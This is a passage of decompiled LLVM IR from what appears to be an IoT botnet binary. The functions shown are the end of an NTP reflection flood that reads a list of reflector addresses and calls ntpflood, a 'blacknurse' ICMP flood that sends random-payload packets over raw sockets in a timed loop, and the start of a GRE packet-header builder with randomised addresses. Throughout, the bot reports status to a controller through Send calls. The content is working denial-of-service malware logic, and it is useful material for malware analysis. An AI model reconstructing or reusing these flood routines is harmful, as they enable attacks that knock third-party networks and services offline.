  %v7_c97c = icmp eq i8 %v2_c978, 10
  br i1 %v7_c97c, label %dec_label_pc_c9a8, label %dec_label_pc_c984

dec_label_pc_c984:                                ; preds = %dec_label_pc_c960
  store i32 %v0_c8e4, i32* %r3.global-to-local, align 4
  store i32 %v1_c964, i32* @r4, align 4
  %v3_c990 = call i32 @strlen(i8* %v4_c968)
  %v0_c998 = load i32, i32* @r4, align 4
  %v2_c998 = add i32 %v0_c998, %v3_c990
  store i32 %v2_c998, i32* %r3.global-to-local, align 4
  %v1_c99c = inttoptr i32 %v2_c998 to i8*
  %v2_c99c = load i8, i8* %v1_c99c, align 1
  %v3_c99c = zext i8 %v2_c99c to i32
  store i32 %v3_c99c, i32* %r3.global-to-local, align 4
  %v7_c9a0 = icmp eq i8 %v2_c99c, 13
  br i1 %v7_c9a0, label %dec_label_pc_c9a8, label %dec_label_pc_cabc

dec_label_pc_c9a8:                                ; preds = %dec_label_pc_c984, %dec_label_pc_c960
  store i32 %v0_c8e4, i32* %r3.global-to-local, align 4
  store i32 %v1_c964, i32* @r4, align 4
  %v3_c9b4 = call i32 @strlen(i8* %v4_c968)
  %v0_c9bc = load i32, i32* @r4, align 4
  %v2_c9bc = add i32 %v0_c9bc, %v3_c9b4
  store i32 %v2_c9bc, i32* %r2.global-to-local, align 4
  %v3_c9c4 = inttoptr i32 %v2_c9bc to i8*
  store i8 0, i8* %v3_c9c4, align 1
  %v2_c9cc = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_c9cc, i32* %r3.global-to-local, align 4
  %v2_c9d0 = icmp eq i32 %v2_c9cc, 0
  %v1_c9dc = call i32 @malloc(i32 540)
  store i32 %v1_c9dc, i32* %r3.global-to-local, align 4
  br i1 %v2_c9d0, label %dec_label_pc_c9d8, label %dec_label_pc_ca48

dec_label_pc_c9d8:                                ; preds = %dec_label_pc_c9a8
  store i32 %v1_c9dc, i32* %r2.global-to-local, align 4
  store i32 %v1_c9dc, i32* @global_var_536c4.157, align 4
  store i32 %v1_c9dc, i32* %r3.global-to-local, align 4
  store i32 %v1_c9dc, i32* @r0, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  %v2_ca00 = call i32 @bzero(i32 %v1_c9dc, i32 16)
  store i32 ptrtoint (i32* @global_var_536c4.157 to i32), i32* %r3.global-to-local, align 4
  %v2_ca08 = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_ca08, i32* @r4, align 4
  store i32 %v0_c8e4, i32* @r0, align 4
  %v1_ca10 = call i32 @inet_addr(i32 %v0_c8e4)
  %v1_ca18 = load i32, i32* @r4, align 4
  %v2_ca18 = add i32 %v1_ca18, 4
  %v3_ca18 = inttoptr i32 %v2_ca18 to i32*
  store i32 %v1_ca10, i32* %v3_ca18, align 4
  %v2_ca20 = load i32, i32* @global_var_536c4.157, align 4
  %v2_ca2c = add i32 %v2_ca20, 532
  %v3_ca2c = inttoptr i32 %v2_ca2c to i32*
  store i32 %v2_ca20, i32* %v3_ca2c, align 4
  %v2_ca34 = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_ca34, i32* %r2.global-to-local, align 4
  store i32 %v2_ca34, i32* %r3.global-to-local, align 4
  %v2_ca40 = add i32 %v2_ca34, 536
  %v3_ca40 = inttoptr i32 %v2_ca40 to i32*
  store i32 %v2_ca34, i32* %v3_ca40, align 4
  br label %dec_label_pc_cab0

dec_label_pc_ca48:                                ; preds = %dec_label_pc_c9a8
  store i32 %v1_c9dc, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 540, i32* @r2, align 4
  %v0_ca64 = call i32 @__GI_memset()
  store i32 %v0_c8e4, i32* @r0, align 4
  %v1_ca6c = call i32 @inet_addr(i32 %v0_c8e4)
  %v2_ca78 = add i32 %v1_c9dc, 4
  %v3_ca78 = inttoptr i32 %v2_ca78 to i32*
  store i32 %v1_ca6c, i32* %v3_ca78, align 4
  %v2_ca80 = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_ca80, i32* %r2.global-to-local, align 4
  %v2_ca88 = add i32 %v1_c9dc, 536
  %v3_ca88 = inttoptr i32 %v2_ca88 to i32*
  store i32 %v2_ca80, i32* %v3_ca88, align 4
  %v2_ca90 = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_ca90, i32* %r3.global-to-local, align 4
  %v1_ca94 = add i32 %v2_ca90, 532
  %v2_ca94 = inttoptr i32 %v1_ca94 to i32*
  %v3_ca94 = load i32, i32* %v2_ca94, align 4
  %v2_ca9c = add i32 %v1_c9dc, 532
  %v3_ca9c = inttoptr i32 %v2_ca9c to i32*
  store i32 %v3_ca94, i32* %v3_ca9c, align 4
  %v2_caa4 = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_caa4, i32* %r2.global-to-local, align 4
  store i32 %v1_c9dc, i32* %r3.global-to-local, align 4
  %v2_caac = add i32 %v2_caa4, 532
  %v3_caac = inttoptr i32 %v2_caac to i32*
  store i32 %v1_c9dc, i32* %v3_caac, align 4
  br label %dec_label_pc_cab0

dec_label_pc_cab0:                                ; preds = %dec_label_pc_c9d8, %dec_label_pc_ca48
  %v1_cab4 = add i32 %stack_var_-60.0.ph, 1
  store i32 %v1_cab4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cabc.outer

dec_label_pc_cabc.outer:                          ; preds = %dec_label_pc_cab0, %dec_label_pc_c814
  %stack_var_-60.0.ph = phi i32 [ %v1_cab4, %dec_label_pc_cab0 ], [ 0, %dec_label_pc_c814 ]
  br label %dec_label_pc_cabc

dec_label_pc_cabc:                                ; preds = %dec_label_pc_cabc.outer, %dec_label_pc_c984
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v3_c950, i32* %r2.global-to-local, align 4
  %v3_cac8 = call i32 @fgets(i32 %v0_c8e4, i32 128, i32 %v3_c950)
  store i32 %v3_cac8, i32* %r3.global-to-local, align 4
  %v2_cad0 = icmp eq i32 %v3_cac8, 0
  br i1 %v2_cad0, label %dec_label_pc_cad8, label %dec_label_pc_c960

dec_label_pc_cad8:                                ; preds = %dec_label_pc_cabc
  %v2_cadc = load i32, i32* @global_var_536c4.157, align 4
  store i32 %v2_cadc, i32* %r3.global-to-local, align 4
  %v1_cae0 = add i32 %v2_cadc, 532
  %v2_cae0 = inttoptr i32 %v1_cae0 to i32*
  %v3_cae0 = load i32, i32* %v2_cae0, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v2_caf4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_caf4, i32* %r1.global-to-local, align 4
  %v4_caf8 = add i32 %v2_caf4, -1088
  %v5_caf8 = inttoptr i32 %v4_caf8 to i16*
  store i16 2, i16* %v5_caf8, align 4
  %v1_cb00 = add i32 %arg4, 4
  store i32 %v1_cb00, i32* %r3.global-to-local, align 4
  %v1_cb04 = inttoptr i32 %v1_cb00 to i32*
  %v2_cb04 = load i32, i32* %v1_cb04, align 4
  store i32 %v2_cb04, i32* %r3.global-to-local, align 4
  store i32 %v2_cb04, i32* @r0, align 4
  %v1_cb0c = call i32 @inet_addr(i32 %v2_cb04)
  %v2_cb24 = mul i32 %v1_c900, 28
  %v1_cb2c = add i32 %v2_cb24, 14
  %v3_cb30 = and i32 %v1_cb2c, -8
  %v1_cb38 = load i32, i32* @sp, align 4
  %v2_cb38 = sub i32 %v1_cb38, %v3_cb30
  %v1_cb3c = add i32 %v2_cb38, 16
  store i32 %v1_cb3c, i32* %r1.global-to-local, align 4
  %v1_cb48 = add i32 %v2_cb38, 23
  %v3_cb4c = and i32 %v1_cb48, -8
  %v2_cba4 = add i32 %v3_cb4c, 8
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v1_c900, i32* %r3.global-to-local, align 4
  %v5_cc2046 = icmp sgt i32 %v1_c900, 0
  br i1 %v5_cc2046, label %dec_label_pc_cb6c, label %dec_label_pc_cc24

dec_label_pc_cb6c:                                ; preds = %dec_label_pc_cad8, %dec_label_pc_cb6c
  %storemerge247 = phi i32 [ %v1_cc0c, %dec_label_pc_cb6c ], [ 0, %dec_label_pc_cad8 ]
  %v3_cb74 = mul i32 %storemerge247, 4
  %v2_cb7c = mul i32 %storemerge247, 28
  %v2_cb80 = add i32 %v2_cb7c, %v3_cb4c
  %v2_cb88 = inttoptr i32 %v2_cb80 to i32*
  store i32 %storemerge247, i32* %v2_cb88, align 4
  %v2_cba8 = add i32 %v2_cba4, %v2_cb7c
  store i32 %v2_cba8, i32* %ip.global-to-local, align 4
  store i32 %v1_cb0c, i32* %r1.global-to-local, align 4
  %v1_cbbc = inttoptr i32 %v2_cba8 to i32*
  %v3_cbbc = add i32 %v2_cba8, 4
  %v4_cbbc = inttoptr i32 %v3_cbbc to i32*
  %v5_cbbc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_cbbc, i32* %v4_cbbc, align 4
  %v6_cbbc = add i32 %v2_cba8, 8
  %v7_cbbc = inttoptr i32 %v6_cbbc to i32*
  %v8_cbbc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_cbbc, i32* %v7_cbbc, align 4
  %v9_cbbc = add i32 %v2_cba8, 12
  %v10_cbbc = inttoptr i32 %v9_cbbc to i32*
  %v11_cbbc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_cbbc, i32* %v10_cbbc, align 4
  %v2_cbdc = add i32 %v2_cb80, 4
  %v2_cbe4 = inttoptr i32 %v2_cbdc to i32*
  store i32 %v3_cae0, i32* %v2_cbe4, align 4
  store i32 %v3_cb4c, i32* %r1.global-to-local, align 4
  store i32 %v3_cb74, i32* %r2.global-to-local, align 4
  store i32 %v2_cb80, i32* %r3.global-to-local, align 4
  %v3_cc04 = call i32 @ntpflood(i32 %v2_cb80, i32 %v3_cb4c, i32 %v3_cb74)
  %v1_cc0c = add nuw nsw i32 %storemerge247, 1
  store i32 %v1_cc0c, i32* %r2.global-to-local, align 4
  store i32 %v1_c900, i32* %r3.global-to-local, align 4
  %v5_cc20 = icmp slt i32 %v1_cc0c, %v1_c900
  br i1 %v5_cc20, label %dec_label_pc_cb6c, label %dec_label_pc_cc14.dec_label_pc_cc24_crit_edge

dec_label_pc_cc14.dec_label_pc_cc24_crit_edge:    ; preds = %dec_label_pc_cb6c
  %v1_cc3c.pre = load i32, i32* @sp, align 4
  br label %dec_label_pc_cc24

dec_label_pc_cc24:                                ; preds = %dec_label_pc_cc14.dec_label_pc_cc24_crit_edge, %dec_label_pc_cad8
  %v1_cc3c = phi i32 [ %v1_cc3c.pre, %dec_label_pc_cc14.dec_label_pc_cc24_crit_edge ], [ %v2_cb38, %dec_label_pc_cad8 ]
  store i32 %v1_cb00, i32* %r3.global-to-local, align 4
  %v2_cc2c = load i32, i32* %v1_cb04, align 4
  store i32 %v2_cc2c, i32* %ip.global-to-local, align 4
  %v1_cc34 = add i32 %arg4, 8
  store i32 %v1_cc34, i32* %r3.global-to-local, align 4
  %v1_cc38 = inttoptr i32 %v1_cc34 to i32*
  %v2_cc38 = load i32, i32* %v1_cc38, align 4
  %v2_cc3c = inttoptr i32 %v1_cc3c to i32*
  store i32 %v2_cc38, i32* %v2_cc3c, align 4
  store i32 ptrtoint ([36 x i8]* @global_var_37508.342 to i32), i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* @r2, align 4
  %v0_cc4c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_cc4c, i32* %r3.global-to-local, align 4
  %v3_cc50 = call i32 @Send(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_37508.342 to i32))
  %v1_cd54 = add i32 %arg4, 24
  %v1_cd58 = inttoptr i32 %v1_cd54 to i32*
  br label %dec_label_pc_cd50

dec_label_pc_cc60:                                ; preds = %dec_label_pc_cd50
  store i32 50, i32* %r1.global-to-local, align 4
  store i32 200, i32* %r2.global-to-local, align 4
  store i32 50000, i32* %r3.global-to-local, align 4
  %v1_cc90 = call i32 @usleep(i32 50000)
  %v2_cc98 = load i32, i32* @global_var_526bc.176, align 4
  %v2_cca0 = mul i32 %v2_cc98, 20
  store i32 %v2_cca0, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v2_cca0, %v1_c91c
  %v2_ccf4 = load i32, i32* @global_var_52590.178, align 4
  store i32 %v2_ccf4, i32* %r3.global-to-local, align 4
  br i1 %tmp, label %dec_label_pc_ccb0, label %dec_label_pc_ccf0

dec_label_pc_ccb0:                                ; preds = %dec_label_pc_cc60
  %v5_ccbc = icmp sgt i32 %v2_ccf4, 0
  br i1 %v5_ccbc, label %dec_label_pc_ccd8, label %dec_label_pc_ccc0

dec_label_pc_ccc0:                                ; preds = %dec_label_pc_ccb0
  %v2_ccc4 = load i32, i32* @global_var_4535c.180, align 4
  %v1_ccc8 = add i32 %v2_ccc4, 100
  store i32 %v1_ccc8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_4535c.180 to i32), i32* %r3.global-to-local, align 4
  store i32 %v1_ccc8, i32* @global_var_4535c.180, align 4
  br label %dec_label_pc_cd38

dec_label_pc_ccd8:                                ; preds = %dec_label_pc_ccb0
  %v1_cce0 = add i32 %v2_ccf4, -1
  store i32 %v1_cce0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_52590.178 to i32), i32* %r3.global-to-local, align 4
  store i32 %v1_cce0, i32* @global_var_52590.178, align 4
  br label %dec_label_pc_cd38

dec_label_pc_ccf0:                                ; preds = %dec_label_pc_cc60
  %v1_ccf8 = add i32 %v2_ccf4, 1
  store i32 %v1_ccf8, i32* %r2.global-to-local, align 4
  store i32 %v1_ccf8, i32* @global_var_52590.178, align 4
  %v2_cd08 = load i32, i32* @global_var_4535c.180, align 4
  store i32 %v2_cd08, i32* %r3.global-to-local, align 4
  %v1_cd0c = add i32 %v2_cd08, -25
  %tmp49 = icmp ult i32 %v2_cd08, 26
  br i1 %tmp49, label %dec_label_pc_cd2c, label %dec_label_pc_cd14

dec_label_pc_cd14:                                ; preds = %dec_label_pc_ccf0
  store i32 %v1_cd0c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_4535c.180 to i32), i32* %r3.global-to-local, align 4
  store i32 %v1_cd0c, i32* @global_var_4535c.180, align 4
  br label %dec_label_pc_cd38

dec_label_pc_cd2c:                                ; preds = %dec_label_pc_ccf0
  store i32 ptrtoint (i32* @global_var_4535c.180 to i32), i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @global_var_4535c.180, align 4
  br label %dec_label_pc_cd38

dec_label_pc_cd38:                                ; preds = %dec_label_pc_cd14, %dec_label_pc_ccd8, %dec_label_pc_ccc0, %dec_label_pc_cd2c
  store i32 ptrtoint (i32* @global_var_526bc.176 to i32), i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @global_var_526bc.176, align 4
  %v1_cd48 = add i32 %storemerge3, 1
  br label %dec_label_pc_cd50

dec_label_pc_cd50:                                ; preds = %dec_label_pc_cc24, %dec_label_pc_cd38
  %storemerge3 = phi i32 [ 0, %dec_label_pc_cc24 ], [ %v1_cd48, %dec_label_pc_cd38 ]
  store i32 %v1_cd54, i32* %r3.global-to-local, align 4
  %v2_cd58 = load i32, i32* %v1_cd58, align 4
  store i32 %v2_cd58, i32* %r3.global-to-local, align 4
  store i32 %v2_cd58, i32* @r0, align 4
  %v1_cd60 = call i32 @atol(i32 %v2_cd58)
  %v2_cd6c = mul i32 %v1_cd60, 20
  store i32 %v2_cd6c, i32* %r2.global-to-local, align 4
  store i32 %storemerge3, i32* %r3.global-to-local, align 4
  %v8_cd78 = icmp sgt i32 %v2_cd6c, %storemerge3
  br i1 %v8_cd78, label %dec_label_pc_cc60, label %dec_label_pc_cd7c

dec_label_pc_cd7c:                                ; preds = %dec_label_pc_cd50
  %v1_cd80 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_cd84

dec_label_pc_cd84:                                ; preds = %entry, %dec_label_pc_c7d4, %dec_label_pc_cd7c
  %v1_cd90 = phi i32 [ %v1_c774, %entry ], [ %v3_c7e4, %dec_label_pc_c7d4 ], [ %v1_cd80, %dec_label_pc_cd7c ]
  ret i32 %v1_cd90

; uselistorder directives
  uselistorder i32 %storemerge3, { 2, 1, 0 }
  uselistorder i32 %v1_cd0c, { 1, 0 }
  uselistorder i32 %v2_ccf4, { 2, 0, 1, 3 }
  uselistorder i32 %v1_cd54, { 1, 0 }
  uselistorder i32 %v1_cc0c, { 2, 1, 0 }
  uselistorder i32 %v2_cba8, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_cb80, { 1, 0, 2, 3 }
  uselistorder i32 %v2_cb7c, { 1, 0 }
  uselistorder i32 %storemerge247, { 3, 2, 1, 0 }
  uselistorder i32 %v3_cb4c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_ca34, { 1, 0, 2, 3 }
  uselistorder i32 %v2_ca20, { 1, 0 }
  uselistorder i32 %v1_c9dc, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %v1_c964, { 1, 2, 0 }
  uselistorder i32 %v3_c950, { 1, 0, 2 }
  uselistorder i32 %v1_c900, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_c8e4, { 9, 2, 1, 4, 3, 5, 0, 6, 8, 7 }
  uselistorder i32 %v2_c858, { 1, 2, 0, 3 }
  uselistorder i32 %v2_c820, { 1, 0, 2 }
  uselistorder i32 %v1_c7f8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v3_c7e4, { 1, 0 }
  uselistorder i32* %v1_c7dc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_c7d8, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 9, 10, 11, 1, 2, 3, 4, 6, 7, 5, 8, 12, 13, 14, 17, 15, 16, 59, 18, 19, 20, 36, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 38, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 58, 57, 0 }
  uselistorder i32* %r2.global-to-local, { 9, 1, 2, 3, 4, 5, 6, 7, 8, 12, 10, 11, 25, 13, 19, 14, 15, 16, 17, 18, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 0 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_cd84, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cd50, { 1, 0 }
  uselistorder label %dec_label_pc_cd38, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_cb6c, { 1, 0 }
  uselistorder label %dec_label_pc_cab0, { 1, 0 }
  uselistorder label %dec_label_pc_c7d4, { 1, 0 }
  uselistorder label %dec_label_pc_c7b0, { 1, 0 }
}

define i32 @blacknurse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 52676, i32* %stack_var_-4, align 4
  %v2_cdc0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_cdc0, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_3752c.345 to i32), i32* @r3, align 4
  %v2_cddc = ptrtoint i32* %stack_var_-100 to i32
  store i32 36, i32* @ip, align 4
  store i32 %v2_cddc, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_3752c.345 to i32), i32* @r1, align 4
  store i32 36, i32* @r2, align 4
  %v0_cdf0 = call i32 @memcpy()
  %v2_ce00 = call i32 @__GI_time(i32* null)
  %v1_ce10 = call i32 @mfork(i32 %arg2)
  %v2_ce18 = icmp eq i32 %v1_ce10, 0
  br i1 %v2_ce18, label %dec_label_pc_ce20, label %dec_label_pc_d064

dec_label_pc_ce20:                                ; preds = %entry
  %v3_ce2c = call i32 @socket(i32 2, i32 3, i32 255)
  %v1_ce3c = icmp slt i32 %v3_ce2c, 0
  br i1 %v1_ce3c, label %dec_label_pc_ce44, label %dec_label_pc_ce4c

dec_label_pc_ce44:                                ; preds = %dec_label_pc_ce20
  %v1_ce48 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_ce4c

dec_label_pc_ce4c:                                ; preds = %dec_label_pc_ce20, %dec_label_pc_ce44
  %v8_ce54 = icmp sgt i32 %arg3, 1
  br i1 %v8_ce54, label %dec_label_pc_ce70, label %dec_label_pc_ce58

dec_label_pc_ce58:                                ; preds = %dec_label_pc_ce4c
  store i32 %arg2, i32* @r2, align 4
  %v3_ce64 = call i32 @Send(i32 %arg1, i32 ptrtoint ([41 x i8]* @global_var_37550.347 to i32))
  %v1_ce6c = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_ce70

dec_label_pc_ce70:                                ; preds = %dec_label_pc_ce4c, %dec_label_pc_ce58
  %v1_ce74 = add i32 %arg4, 4
  %v1_ce78 = inttoptr i32 %v1_ce74 to i32*
  %v2_ce78 = load i32, i32* %v1_ce78, align 4
  %v1_ce84 = add i32 %arg4, 8
  %v1_ce88 = inttoptr i32 %v1_ce84 to i32*
  %v2_ce88 = load i32, i32* %v1_ce88, align 4
  store i32 %v2_ce88, i32* @r0, align 4
  %v1_ce90 = call i32 @atol(i32 %v2_ce88)
  %v2_ce9c = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_ce9c, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 32, i32* @r2, align 4
  %v0_ceac = call i32 @__GI_memset()
  %v2_cebc = ptrtoint i32* %stack_var_-104 to i32
  %v5_ced0 = inttoptr i32 %v2_ce78 to i8*
  %v6_ced0 = call i32 @getaddrinfo(i8* %v5_ced0, i32 0, i32 %v2_ce9c, i32 %v2_cebc, i32 2)
  %v2_cee0 = icmp eq i32 %v6_ced0, 0
  br i1 %v2_cee0, label %dec_label_pc_cef0, label %dec_label_pc_cee8

dec_label_pc_cee8:                                ; preds = %dec_label_pc_ce70
  %v1_ceec = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_cef0

dec_label_pc_cef0:                                ; preds = %dec_label_pc_ce70, %dec_label_pc_cee8
  %v3_cefc = call i32 @socket(i32 2, i32 3, i32 1)
  %v3_cf0c = icmp eq i32 %v3_cefc, -1
  br i1 %v3_cf0c, label %dec_label_pc_cf14, label %dec_label_pc_cf24

dec_label_pc_cf14:                                ; preds = %dec_label_pc_cef0
  %v3_cf18 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_3757c.349, i32 0, i32 0))
  %v1_cf20 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_cf24

dec_label_pc_cf24:                                ; preds = %dec_label_pc_cef0, %dec_label_pc_cf14
  store i32 %arg2, i32* @r2, align 4
  %v3_cf34 = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_37584.351 to i32))
  store i32 %v3_cefc, i32* %stack_var_-144, align 4
  %v2_cfe0 = ptrtoint i32* %stack_var_-144 to i32
  %v2_d038 = add i32 %v1_ce90, %v2_ce00
  br label %dec_label_pc_cf50.outer

dec_label_pc_cf50.outer:                          ; preds = %dec_label_pc_d054, %dec_label_pc_cf24
  %stack_var_-40.0.ph = phi i32 [ %v1_d058, %dec_label_pc_d054 ], [ %tmp, %dec_label_pc_cf24 ]
  br label %dec_label_pc_cf5c.lr.ph

dec_label_pc_cf5c.lr.ph:                          ; preds = %dec_label_pc_cfe0, %dec_label_pc_cf50.outer
  br label %dec_label_pc_cf5c

dec_label_pc_cf5c:                                ; preds = %dec_label_pc_cf5c.lr.ph, %dec_label_pc_cf5c
  %storemerge15 = phi i32 [ 20, %dec_label_pc_cf5c.lr.ph ], [ %v1_cf7c, %dec_label_pc_cf5c ]
  %v2_cf64 = add i32 %storemerge15, %v2_cddc
  store i32 %v2_cf64, i32* @r4, align 4
  %v0_cf68 = call i32 @rand()
  %v1_cf74 = trunc i32 %v0_cf68 to i8
  %v2_cf74 = load i32, i32* @r4, align 4
  %v3_cf74 = inttoptr i32 %v2_cf74 to i8*
  store i8 %v1_cf74, i8* %v3_cf74, align 1
  %v1_cf7c = add i32 %storemerge15, 1
  %tmp35 = icmp ult i32 %v1_cf7c, 32
  br i1 %tmp35, label %dec_label_pc_cf5c, label %dec_label_pc_cf90

dec_label_pc_cf90:                                ; preds = %dec_label_pc_cf5c
  %v3_cf90 = load i32, i32* %stack_var_-104, align 4
  %v1_cf94 = add i32 %v3_cf90, 20
  %v2_cf94 = inttoptr i32 %v1_cf94 to i32*
  %v3_cf94 = load i32, i32* %v2_cf94, align 4
  %v1_cf9c = add i32 %v3_cf90, 16
  %v2_cf9c = inttoptr i32 %v1_cf9c to i32*
  %v3_cf9c = load i32, i32* %v2_cf9c, align 4
  %v6_cfb8 = call i32 @sendto(i32 %v3_cefc, i32 %v2_cddc, i32 36, i32 0, i32 %v3_cf94, i32 %v3_cf9c)
  %v9_cfc4 = icmp eq i32 %v6_cfb8, 36
  br i1 %v9_cfc4, label %dec_label_pc_d018, label %dec_label_pc_cfcc

dec_label_pc_cfcc:                                ; preds = %dec_label_pc_cf90
  %v0_cfcc = call i32 @__errno_location()
  %v1_cfd4 = inttoptr i32 %v0_cfcc to i32*
  %v2_cfd4 = load i32, i32* %v1_cfd4, align 4
  %v7_cfd8 = icmp eq i32 %v2_cfd4, 105
  br i1 %v7_cfd8, label %dec_label_pc_cfe0, label %dec_label_pc_cff8

dec_label_pc_cfe0:                                ; preds = %dec_label_pc_cfcc
  %v3_cff0 = call i32 @__GI_poll(i32 %v2_cfe0, i32 1, i32 1000)
  br label %dec_label_pc_cf5c.lr.ph

dec_label_pc_cff8:                                ; preds = %dec_label_pc_cfcc
  %v3_cffc = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_375a0.353, i32 0, i32 0))
  %v1_d004 = call i32 @close(i32 %v3_cefc)
  %v3_d008 = load i32, i32* %stack_var_-104, align 4
  %v1_d010 = call i32 @freeaddrinfo(i32 %v3_d008)
  br label %dec_label_pc_d064

dec_label_pc_d018:                                ; preds = %dec_label_pc_cf90
  %v7_d020 = icmp slt i32 %stack_var_-40.0.ph, 100
  br i1 %v7_d020, label %dec_label_pc_d054, label %dec_label_pc_d024

dec_label_pc_d024:                                ; preds = %dec_label_pc_d018
  %v2_d028 = call i32 @__GI_time(i32* null)
  %v5_d040 = icmp slt i32 %v2_d028, %v2_d038
  br i1 %v5_d040, label %dec_label_pc_d04c, label %dec_label_pc_d044

dec_label_pc_d044:                                ; preds = %dec_label_pc_d024
  %v1_d048 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_d04c

dec_label_pc_d04c:                                ; preds = %dec_label_pc_d024, %dec_label_pc_d044
  br label %dec_label_pc_d054

dec_label_pc_d054:                                ; preds = %dec_label_pc_d018, %dec_label_pc_d04c
  %stack_var_-40.1 = phi i32 [ %stack_var_-40.0.ph, %dec_label_pc_d018 ], [ 0, %dec_label_pc_d04c ]
  %v1_d058 = add i32 %stack_var_-40.1, 1
  br label %dec_label_pc_cf50.outer

dec_label_pc_d064:                                ; preds = %entry, %dec_label_pc_cff8
  %v1_d06c = phi i32 [ %v1_ce10, %entry ], [ %v1_d010, %dec_label_pc_cff8 ]
  ret i32 %v1_d06c

; uselistorder directives
  uselistorder i32 %storemerge15, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.ph, { 1, 0 }
  uselistorder i32 %v2_cddc, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-144, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_d064, { 1, 0 }
  uselistorder label %dec_label_pc_d054, { 1, 0 }
  uselistorder label %dec_label_pc_d04c, { 1, 0 }
  uselistorder label %dec_label_pc_cf5c, { 1, 0 }
  uselistorder label %dec_label_pc_cf24, { 1, 0 }
  uselistorder label %dec_label_pc_cef0, { 1, 0 }
  uselistorder label %dec_label_pc_ce70, { 1, 0 }
  uselistorder label %dec_label_pc_ce4c, { 1, 0 }
}

define i32 @setup_gre_ip_header(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_d088 = load i32, i32* @r4, align 4
  %v6_d088 = load i32, i32* @r5, align 4
  %v9_d088 = load i32, i32* @r6, align 4
  %v12_d088 = load i32, i32* @fp, align 4
  store i32 53392, i32* %stack_var_-4, align 4
  %v2_d08c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_d08c, i32* @fp, align 4
  store i32 21, i32* @global_var_53714.355, align 4
  store i8 69, i8* inttoptr (i32 1 to i8*), align 1
  store i8 0, i8* inttoptr (i32 2 to i8*), align 2
  %v2_d12c = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_d12c, i32* @r6, align 4
  %v2_d13c = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_d13c, i32* @r4, align 4
  %v2_d14c = call i32 @realrand(i32 1, i32 255)
  store i32 %v2_d14c, i32* @r5, align 4
  %v2_d15c = call i32 @realrand(i32 1, i32 255)
  %v0_d164 = load i32, i32* @r4, align 4
  %v0_d168 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_536e4.357 to i32), i32* @r0, align 4
